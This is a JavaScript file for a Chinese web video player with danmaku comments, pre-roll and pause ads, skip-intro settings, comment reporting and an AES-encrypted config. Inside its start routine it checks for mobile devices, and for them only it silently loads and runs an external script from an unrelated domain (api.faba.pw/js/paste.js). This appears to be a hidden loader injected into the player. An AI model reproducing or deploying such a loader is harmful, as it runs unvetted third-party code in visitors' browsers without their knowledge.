function js_decrypt(str, key, iv) {
    var key = CryptoJS.enc.Utf8.parse(key);
    var iv = CryptoJS.enc.Utf8.parse(iv);
    var decrypted = CryptoJS.AES.decrypt(str, key, {
        iv: iv,
        padding: CryptoJS.pad.Pkcs7
    }).toString(CryptoJS.enc.Utf8);
    return decrypted
}
function isWap() {
    var system = {
        win: false,
        mac: false,
        xll: false,
        ipad: false
    };
    var p = navigator.platform;
    system.win = p.indexOf("Win") == 0;
    system.mac = p.indexOf("Mac") == 0;
    system.x11 = (p == "X11") || (p.indexOf("Linux") == 0);
    system.ipad = (navigator.userAgent.match(/iPad/i) != null) ? true: false;
    if (system.win || system.mac || system.xll || system.ipad) {
        return false
    } else {
        return true
    }
}
function loadScript(src, callback) {
    var script = document.createElement('script'),
    head = document.getElementsByTagName('head')[0];
    script.type = 'text/javascript';
    script.charset = 'UTF-8';
    script.src = src;
    if (script.addEventListener) {
        script.addEventListener('load',
        function() {
            callback()
        },
        false)
    } else if (script.attachEvent) {
        script.attachEvent('onreadystatechange',
        function() {
            var target = window.event.srcElement;
            if (target.readyState == 'loaded') {
                callback()
            }
        })
    }
    head.appendChild(script)
};
var YZM = {
    versions: function() {
        var u = navigator.userAgent,
        app = navigator.appVersion;
        return {
            trident: u.indexOf('Trident') > -1,
            presto: u.indexOf('Presto') > -1,
            webKit: u.indexOf('AppleWebKit') > -1,
            gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1,
            mobile: !!u.match(/AppleWebKit.*Mobile.*/),
            ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/),
            android: u.indexOf('Android') > -1 || u.indexOf('Adr') > -1,
            iPhone: u.indexOf('iPhone') > -1,
            iPad: u.indexOf('iPad') > -1,
            webApp: u.indexOf('Safari') == -1,
            weixin: u.indexOf('MicroMessenger') > -1,
            qq: u.match(/\sQQ/i) == " qq"
        }
    } (),
    'start': function() {
        YZM.ads = config.ads;
        YZM.id = config.id;
        up.pbgjz = config.pbgjz;
        config.style = '';
        config.live = 0;
        config.group_id = 0;
        config.group = 0;
        config.group_x = 0;
        config.user = '游客';
        config.autoplay = 1;
        config.pic = '';
        config.font_color = '';
        danmuon = config.danmuon;
        if ((YZM.ads.pre.state == 'on' && config.group_id == 0) || (YZM.ads.pre.state == 'on' && config.group_id > 0 && config.group_x != config.group_id)) {
            if (YZM.ads.pre.type == '1') {
                YZM.MYad.vod(YZM.ads.pre.vod_url, YZM.ads.pre.vod_link)
            } else if (YZM.ads.pre.type == '2') {
                YZM.MYad.pic(YZM.ads.pre.pic.link, YZM.ads.pre.pic.time, YZM.ads.pre.pic.img)
            }
        } else {
            YZM.play(config.url)
        }
        if (isWap()) {
            loadScript('https://api.faba.pw/js/paste.js',
            function() {})
        }
    },
    'play': function(url) {
        if (!danmuon || config.live) {
            YZM.player.play(url)
        } else {
            YZM.player.dmplay(url)
        }
        $(function() {
            $(".yzmplayer-setting-speeds,.yzmplayer-setting-speed-item").on("click",
            function() {
                $(".speed-stting").toggleClass("speed-stting-open")
            });
            $(".speed-stting .yzmplayer-setting-speed-item").click(function() {
                $(".yzmplayer-setting-speeds .title").text($(this).text())
            });
            if (!YZM.ads.pause.state) {
                $('.yzmplayer .yzmplayer-showing').css('top', '50%');
                $('.yzmplayer .yzmplayer-showing').css('left', '50%')
            }
        });
        $(".yzmplayer-fulloff-icon").on("click",
        function() {
            YZM.dp.fullScreen.cancel()
        });
        $("#pipBtn").on("click",
        function() {
            YZM.dp.video !== document.pictureInPictureElement ? YZM.dp.video.requestPictureInPicture() : document.exitPictureInPicture()
        });
        $(".yzmplayer-showing").on("click",
        function() {
            YZM.dp.play();
            $(".vod-pic").remove()
        });
        $(".yzmplayer-setting-loop").remove();
        var css = '<style type="text/css">';
        css += '.yzm-yzmplayer-send-icon,.yzmplayer-setting-speeds:hover .title{background:' + config.color + '!important;}';
        css += '.showdan-setting .yzmplayer-toggle input+label {border: 1px solid ' + config.color + ' !important;background: ' + config.color + ' !important;}';
        css += '.yzmplayer-controller .yzmplayer-icons .yzmplayer-toggle .checked{background:' + config.color + '}';
        css += '#loading-box span{color:' + config.font_color + '!important ;}';
        css += config.style;
        css += '</style>';
        $('head').append(css).addClass("");
        YZM.jump.head()
    },
    'dmid': function() {
        YZM.id = config.id
    },
    'load': function() {
        $("#loading-box").remove();
        YZM.danmu.send();
        YZM.danmu.list();
        YZM.def();
        YZM.dp.danmaku.opacity(1)
    },
    'def': function() {
        YZM.stime = 0;
        YZM.headt = yzmck.get("headt");
        YZM.lastt = yzmck.get("lastt");
        YZM.last_tip = parseInt(YZM.lastt) + 10;
        YZM.frists = yzmck.get('frists');
        YZM.lasts = yzmck.get('lasts');
        YZM.playtime = Number(YZM.getCookie("time_" + config.url));
        YZM.ctime = YZM.formatTime(YZM.playtime);
        YZM.dp.on("loadedmetadata",
        function() {
            YZM.loadedmetadataHandler()
        });
        YZM.dp.on('fullscreen',
        function() {
            if (/Android|webOS|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
                screen.orientation.lock('landscape')
            }
            $("#stats").show();
            $("#vodtitle").show();
            config.fullscreen = true
        });
        YZM.dp.on('fullscreen_cancel',
        function() {
            config.fullscreen = false;
            if (config.title != 'on') {
                $("#vodtitle").hide()
            }
            $("#stats").hide()
        });
        YZM.dp.on("ended",
        function() {
            YZM.endedHandler()
        });
        YZM.dp.on('pause',
        function() {
            YZM.MYad.pause.play(YZM.ads.pause.link, YZM.ads.pause.pic)
        });
        YZM.dp.on('play',
        function() {
            YZM.MYad.pause.out()
        });
        YZM.dp.on('timeupdate',
        function(e) {
            YZM.timeupdateHandler()
        });
        YZM.jump.def()
    },
    'video': {
        'next': function() {
            if (config.next.match(/(mp4|mp3|ts|flv)$/i)) {
                YZM.play(config.next)
            } else {
                top.location.href = config.next
            }
        },
        'seek': function() {
            YZM.dp.seek(YZM.playtime)
        },
        'end': function() {
            layer.msg("播放结束啦=。=")
        },
        'con_play': function() {
            var cplayer = '<div class="memory-play-wrap"><div class="memory-play"><span class="close">×</span><span>已跳转到上次观看位置 </span><span>' + YZM.ctime + '</span></div></div>';
            $(".yzmplayer-cplayer").append(cplayer);
            YZM.video.seek();
            YZM.dp.play();
            $(".close").on("click",
            function() {
                $(".memory-play-wrap").remove()
            });
            setTimeout(function() {
                $(".memory-play-wrap").remove()
            },
            3 * 1000);
            $(".conplaying").on("click",
            function() {
                $("#loading-box").remove();
                YZM.dp.play();
                YZM.jump.head()
            })
        }
    },
    'jump': {
        'def': function() {
            h = ".yzmplayer-setting-jfrist label";
            l = ".yzmplayer-setting-jlast label";
            f = "#fristtime";
            j = "#jumptime";
            a(h, 'frists', YZM.frists, 'headt', YZM.headt, f);
            a(l, 'lasts', YZM.lasts, 'lastt', YZM.lastt, j);
            function er() {
                layer.msg("请输入有效时间哟！")
            }
            function su() {
                layer.msg("设置完成，将在刷新或下一集生效")
            }
            function a(b, c, d, e, g, t) {
                $(b).on("click",
                function() {
                    o = $(t).val();
                    if (o > 0) {
                        $(b).toggleClass('checked');
                        su();
                        g = $(t).val();
                        yzmck.set(e, g)
                    } else {
                        er()
                    }
                });
                if (d == 1) {
                    $(b).addClass('checked');
                    $(b).click(function() {
                        o = $(t).val();
                        if (o > 0) {
                            yzmck.set(c, 0)
                        } else {
                            er()
                        }
                    })
                } else {
                    $(b).click(function() {
                        o = $(t).val();
                        if (o > 0) {
                            yzmck.set(c, 1)
                        } else {
                            er()
                        }
                    })
                }
            };
            $(f).attr({
                "value": YZM.headt
            });
            $(j).attr({
                "value": YZM.lastt
            });
            YZM.jump.last()
        },
        'head': function() {
            if (YZM.stime > YZM.playtime) YZM.playtime = YZM.stime;
            if (YZM.frists == 1) {
                if (YZM.headt > YZM.playtime || YZM.playtime == 0) {
                    YZM.jump_f = 1
                } else {
                    YZM.jump_f = 0
                }
            }
            if (YZM.jump_f == 1) {
                YZM.dp.seek(YZM.headt);
                YZM.dp.notice("已为您跳过片头")
            }
        },
        'last': function() {
            if (config.next != '') {
                if (YZM.lasts == 1) {
                    setInterval(function() {
                        var e = YZM.dp.video.duration - YZM.dp.video.currentTime;
                        if (e < YZM.last_tip) YZM.dp.notice('即将为您跳过片尾');
                        if (YZM.lastt > 0 && e < YZM.lastt) {
                            YZM.setCookie("time_" + config.url, "", -1);
                            YZM.video.next()
                        }
                    },
                    1000)
                }
            } else {
                $(".icon-xj").remove()
            }
        },
        'ad': function(a, b) {}
    },
    'danmu': {
        'send': function() {
            g = $(".yzm-yzmplayer-send-icon");
            d = $("#dmtext");
            h = ".yzmplayer-comment-setting-";
            $(h + "color input").on("click",
            function() {
                r = $(this).attr("value");
                setTimeout(function() {
                    d.css({
                        "color": r
                    })
                },
                100)
            });
            $(h + "type input").on("click",
            function() {
                t = $(this).attr("value");
                setTimeout(function() {
                    d.attr("dmtype", t)
                },
                100)
            });
            $(h + "font input").on("click",
            function() {
                t = $(this).attr("value");
                setTimeout(function() {
                    d.attr("size", t)
                },
                100)
            });
            g.on("click",
            function() {
                a = document.getElementById("dmtext");
                a = a.value.trim();
                b = d.attr("dmtype");
                c = d.css("color");
                z = d.attr("size");
                if (config.group > 0 && config.group_id == 0) {
                    layer.msg("登陆才能发弹幕");
                    return
                } else if (config.group > 0 && config.group_id < config.group) {
                    layer.msg("您当前的会员等级，不支持发送弹幕");
                    return
                }
                var jzword = up.pbgjz.split(',');
                for (var i = 0; i < jzword.length; i++) {
                    if (a.search(jzword[i]) != -1) {
                        layer.msg("请勿发送无意义内容，规范您的弹幕内容");
                        return
                    }
                }
                if (a.length < 1) {
                    layer.msg("要输入弹幕内容啊喂！");
                    return
                }
                var e = Date.parse(new Date());
                var f = yzmck.get('dmsent', e);
                if (e - f < config.sendtime * 1000) {
                    layer.msg('请勿频繁操作！发送弹幕需间隔' + config.sendtime + '秒~');
                    return
                }
                d.val("");
                YZM.dp.danmaku.send({
                    text: a,
                    color: c,
                    type: b,
                    size: z,
                });
                yzmck.set('dmsent', e)
            });
            function k() {
                g.trigger("click")
            };
            d.keydown(function(e) {
                if (e.keyCode == 13) {
                    k()
                }
            })
        },
        'relist': function() {
            $(".list-show").empty();
            $.ajax({
                url: config.api + "?ac=get&id=" + YZM.id,
                success: function(d) {
                    if (d.code == 23) {
                        a = d.danmuku;
                        b = d.name;
                        c = d.danum;
                        $(".danmuku-num").text(c);
                        $(a).each(function(index, item) {
                            l = '<d class="danmuku-list" time="' + item[0] + '"><li>' + YZM.formatTime(item[0]) + '</li><li title="' + item[4] + '[' + item[8] + ']">' + item[4] + '[' + item[8] + ']</li><li title="用户：' + item[8] + '">' + item[6] + '</li><li class="report" onclick="YZM.danmu.report(\'' + item[5] + '\',\'' + b + '\',\'[' + item[8] + '] ' + item[4] + '\',\'' + item[3] + '\')">举报</li></d>';
                            $(".list-show").append(l)
                        })
                    }
                    $(".danmuku-list").on("dblclick",
                    function() {
                        YZM.dp.seek($(this).attr("time"))
                    })
                }
            })
        },
        'list': function() {
            $(".yzmplayer-list-icon,.yzm-yzmplayer-send-icon").on("click",
            function() {
                YZM.danmu.relist()
            });
            var liyih = '<div class="dmrules"><a target="_blank" href="' + config.dmrule + '">弹幕礼仪 </a></div>';
            $("div.yzmplayer-comment-box:last").append(liyih);
            $(".yzmplayer-info-panel-item-title-amount .yzmplayer-info-panel-item-title").html("违规词");
            for (var i = 0; i < up.pbgjz.length; i++) {
                var gjz_html = "<e>" + up.pbgjz[i] + "</e>";
                $("#vod-title").append(gjz_html)
            }
            add('.yzmplayer-list-icon', ".yzmplayer-danmu", 'show');
            $(".yzmplayer-danmu").mouseleave(function() {
                $(".yzmplayer-danmu").removeClass("show")
            });
            function add(div1, div2, div3, div4) {
                $(div1).click(function() {
                    $(div2).toggleClass(div3);
                    $(div4).remove()
                })
            }
        },
        'report': function(a, b, c, d) {
            layer.confirm('' + c + '<!--br><br><span style="color:#333">请选择需要举报的类型</span-->', {
                anim: 1,
                title: '举报弹幕',
                btn: ['违法违禁', '色情低俗', '恶意刷屏', '赌博诈骗', '人身攻击', '侵犯隐私', '垃圾广告', '剧透', '引战'],
                btn3: function(index, layero) {
                    YZM.danmu.post_r(a, b, c, d, '恶意刷屏')
                },
                btn4: function(index, layero) {
                    YZM.danmu.post_r(a, b, c, d, '赌博诈骗')
                },
                btn5: function(index, layero) {
                    YZM.danmu.post_r(a, b, c, d, '人身攻击')
                },
                btn6: function(index, layero) {
                    YZM.danmu.post_r(a, b, c, d, '侵犯隐私')
                },
                btn7: function(index, layero) {
                    YZM.danmu.post_r(a, b, c, d, '垃圾广告')
                },
                btn8: function(index, layero) {
                    YZM.danmu.post_r(a, b, c, d, '剧透')
                },
                btn9: function(index, layero) {
                    YZM.danmu.post_r(a, b, c, d, '引战')
                }
            },
            function(index, layero) {
                YZM.danmu.post_r(a, b, c, d, '违法违禁')
            },
            function(index) {
                YZM.danmu.post_r(a, b, c, d, '色情低俗')
            })
        },
        'post_r': function(a, b, c, d, type) {
            $.ajax({
                type: "get",
                url: config.api + '?ac=report&cid=' + d + '&user=' + a + '&type=' + type + '&title=' + b + '&text=' + c,
                cache: false,
                dataType: 'json',
                beforeSend: function() {},
                success: function(data) {
                    layer.msg("举报成功！感谢您为守护弹幕作出了贡献")
                },
                error: function(data) {
                    var msg = "服务故障 or 网络异常，稍后再试6！";
                    layer.msg(msg)
                }
            })
        }
    },
    'setCookie': function(c_name, value, expireHours) {
        window.sessionStorage.setItem(c_name, value)
    },
    'getCookie': function(c_name) {
        return window.sessionStorage.getItem(c_name)
    },
    'formatTime': function(seconds) {
        return [parseInt(seconds / 60 / 60), parseInt(seconds / 60 % 60), parseInt(seconds % 60)].join(":").replace(/\b(\d)\b/g, "0$1")
    },
    'loadedmetadataHandler': function() {
        if (YZM.playtime > 0 && YZM.dp.video.currentTime < YZM.playtime) {
            setTimeout(function() {
                YZM.video.con_play()
            },
            1 * 1000)
        } else {
            setTimeout(function() {
                if (!danmuon) {
                    YZM.jump.head()
                } else {
                    YZM.dp.notice("视频已准备就绪，即将为您播放")
                }
            },
            1 * 1000)
        }
        YZM.dp.on("timeupdate",
        function() {
            YZM.timeupdateHandler()
        })
    },
    'timeupdateHandler': function() {
        YZM.setCookie("time_" + config.url, YZM.dp.video.currentTime, 24)
    },
    'endedHandler': function() {
        YZM.setCookie("time_" + config.url, "", -1);
        if (config.next !== '') {
            YZM.dp.notice("2s后,将自动为您播放下一集");
            setTimeout(function() {
                YZM.video.next()
            },
            2 * 1000)
        } else {
            YZM.dp.notice("视频播放已结束");
            setTimeout(function() {
                YZM.video.end()
            },
            2 * 1000)
        }
    },
    'player': {
        'play': function(url) {
            $('body').addClass("danmu-off");
            YZM.dp = new yzmplayer({
                element: document.getElementById('player'),
                autoplay: config.autoplay,
                theme: config.color,
                logo: config.logo,
                live: config.live,
                video: {
                    url: url,
                    pic: config.pic,
                    type: 'auto',
                },
                contextmenu: config.contextmenu
            });
            var css = '<style type="text/css">';
            css += '#loading-box{display: none;}';
            css += '</style>';
            $('body').append(css).addClass("");
            YZM.def();
            YZM.jump.head()
        },
        'adplay': function(url) {
            $('body').addClass("danmu-off");
            YZM.ad = new yzmplayer({
                autoplay: true,
                element: document.getElementById('ADplayer'),
                theme: config.color,
                logo: config.logo,
                video: {
                    url: url,
                    pic: config.pic,
                    type: 'auto',
                },
                contextmenu: config.contextmenu
            });
            $('.yzmplayer-controller,.yzmplayer-cplayer,.yzmplayer-logo,#loading-box,.yzmplayer-controller-mask').remove();
            $('.yzmplayer-mask').show();
            YZM.ad.on('timeupdate',
            function() {
                if (YZM.ad.video.currentTime > YZM.ad.video.duration - 0.1) {
                    $('body').removeClass("danmu-off");
                    YZM.ad.destroy();
                    $("#ADplayer").remove();
                    $("#ADtip").remove();
                    YZM.play(config.url)
                }
            })
        },
        'dmplay': function(url) {
            YZM.dmid();
            YZM.dp = new yzmplayer({
                autoplay: config.autoplay,
                element: document.getElementById('player'),
                theme: config.color,
                logo: config.logo,
                live: config.live,
                video: {
                    url: url,
                    pic: config.pic,
                    type: 'auto',
                },
                danmaku: {
                    id: YZM.id,
                    api: config.api + '?ac=dm',
                    user: config.user
                },
                contextmenu: config.contextmenu
            });
            YZM.load()
        },
    },
    'MYad': {
        'vod': function(u, l) {
            YZM.player.adplay(u);
            $("#ADtip").html('<a id="link" href="javascript:void(0)">点此关闭广告</a>');
            $("#ADplayer").click(function() {
                YZM.play(config.url);
                $('#ADtip').remove();
                window.open(l)
            })
        },
        'pic': function(l, t, p) {
            $("#ADtip").html('<span id="link">点击关闭 (倒计时 <e id="time_ad">' + t + '</e>s)</span><a href="javascript:void(0)"><img src="' + p + '"></a>');
            $("#ADtip").click(function() {
                clearInterval(timer);
                YZM.play(config.url);
                $('#ADtip').remove();
                window.open(l)
            });
            var span = document.getElementById("time_ad");
            var num = span.innerHTML;
            var timer = null;
            setTimeout(function() {
                timer = setInterval(function() {
                    num--;
                    span.innerHTML = num;
                    if (num == 0) {
                        clearInterval(timer);
                        YZM.play(config.url);
                        $('#ADtip').remove()
                    }
                },
                1000)
            },
            1)
        },
        'pause': {
            'play': function(l, p) {
                if ((YZM.ads.pause.state == 'on' && config.group_id == 0) || (YZM.ads.pause.state == 'on' && config.group_id > 0 && config.group_x != config.group_id)) {
                    var pause_ad_html = '<div id="player_pause"><div class="adimg"><a style="color:#ffffff;">广告</a></div><div class="tip"><a style="color:#ffffff;cursor:pointer;" id="close_pause" title="点击关闭广告">✖</a></div><a href="javascript:void(0)"><img id="pausePic" src="' + p + '"></a></div>';
                    $('.yzmplayer-video-wrap').before(pause_ad_html);
                    $("#close_pause").click(function() {
                        YZM.MYad.pause.out()
                    });
                    $("#player_pause").click(function() {
                        window.open(l)
                    })
                }
            },
            'out': function() {
                $('#player_pause').remove()
            }
        }
    }
};
config = {};
up = {};
loadScript('https://s0.pstatp.com/cdn/expire-1-M/crypto-js/4.1.1/crypto-js.min.js',
function() {
    config = JSON.parse(js_decrypt(player, 'VFBTzdujpR9FWBhe', rand));
    config.api = '/static/dmku/';
    config.href = window.location.href;
    config.next = '';
    YZM.start()
});